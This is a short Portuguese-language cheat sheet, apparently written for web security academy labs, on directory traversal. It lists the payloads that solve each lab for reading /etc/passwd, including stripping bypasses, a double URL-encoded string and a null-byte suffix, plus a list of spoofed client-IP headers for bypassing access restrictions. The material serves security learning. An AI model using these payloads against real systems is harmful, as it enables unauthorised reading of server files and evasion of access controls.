# Directory Traversal

O scanner do Burp provavelmente vai encontrar essa vulnerabilidade, mas de toda forma ela é facilmente identificada.

Em qualquer lugar que esteja lendo arquivos, tente ler `/etc/passwd` ou `/home/carlos/secret`. Provavelmente algum bypass será necessário.

Dê uma olhada no source code para ver da onde as imagens estão sendo carregadas. Colocar imagens para serem exibidas no Filtro do histórico do Burp também ajuda.

![image](https://github.com/user-attachments/assets/6d15780a-66b2-4e7f-babd-4835b8788c3b)

<br>

## Laboratórios

**File Path Traversal, Traversal Sequences Blocked with Absolute Path Bypass**
```
/image?filename=/etc/passwd
```

<br>
<br>

File Path Traversal, Traversal Sequences Stripped Non-Recursively
```
GET /image?filename=....//....//....//etc//passwd

OU

/image?filename=..././..././..././etc/passwd
```

<br>
<br>

**File Path Traversal, Traversal Sequences Stripped with Superfluous URL-Decode**

Encode o payload em URL duas vezes.
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

<br>
<br>

**File Path Traversal, Validation of Start of Path**

```
/image?filename=/var/www/images/../../../../etc/passwd
```

<br>
<br>

**File Path Traversal, Validation of File Extension with Null Byte Bypass**
```
../../../../../../etc/passwd%00.jpg
```

<br>

### Outros

**Path Traversal Auth**

Adicionar alguns headers na requisição pode ajudar a bypassar restrições em requisições vulneráveis a Directory Traversal.
```
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: localhost
X-Forward-For: localhost
X-Remote-IP: localhost
X-Client-IP: localhost
X-Real-IP: localhost
X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
```
